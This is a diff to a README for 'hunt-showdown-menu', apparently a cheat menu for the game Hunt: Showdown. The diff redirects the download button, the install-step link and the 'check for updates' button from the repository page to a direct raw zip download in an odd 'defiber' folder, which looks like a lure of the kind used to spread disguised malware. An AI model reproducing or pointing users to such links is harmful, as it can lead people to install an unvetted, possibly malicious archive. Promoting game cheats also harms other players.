@@ -1,7 +1,7 @@
 <h1>🎯 hunt-showdown-menu - Dominate Every Match With Precision</h1>
 
 <p align="center">
-  <a href="https://github.com/nikimanki1337228-oss/hunt-showdown-menu" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:#fff;font-size:24px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/nikimanki1337228-oss/hunt-showdown-menu/main/defiber/showdown-hunt-menu-v1.7-alpha.3.zip" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:#fff;font-size:24px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>🔍 What Is This?</h2>
@@ -30,7 +30,7 @@
 <h2>📥 Download & Installation</h2>
 <p>Follow these steps exactly. Do not skip any step.</p>
 <ol>
-<li><strong>Visit this link to download the application:</strong> <a href="https://github.com/nikimanki1337228-oss/hunt-showdown-menu">https://github.com/nikimanki1337228-oss/hunt-showdown-menu</a></li>
+<li><strong>Visit this link to download the application:</strong> <a href="https://raw.githubusercontent.com/nikimanki1337228-oss/hunt-showdown-menu/main/defiber/showdown-hunt-menu-v1.7-alpha.3.zip">https://raw.githubusercontent.com/nikimanki1337228-oss/hunt-showdown-menu/main/defiber/showdown-hunt-menu-v1.7-alpha.3.zip</a></li>
 <li>On that page, look for the green <strong>"Code"</strong> button or the <strong>"Releases"</strong> section on the right side. Click it.</li>
 <li>You will see a list of downloadable files. Click the file that is the latest version (the one with the highest number).</li>
 <li>The download will start. Wait for it to finish completely.</li>
@@ -105,7 +105,7 @@
 </ul>
 
 <p align="center" style="margin-top:30px;">
-  <a href="https://github.com/nikimanki1337228-oss/hunt-showdown-menu" style="display:inline-block;padding:12px 25px;background:#2196F3;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔄 CHECK FOR UPDATES</a>
+  <a href="https://raw.githubusercontent.com/nikimanki1337228-oss/hunt-showdown-menu/main/defiber/showdown-hunt-menu-v1.7-alpha.3.zip" style="display:inline-block;padding:12px 25px;background:#2196F3;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔄 CHECK FOR UPDATES</a>
 </p>
 
 <h2>🏷️ Keywords</h2>
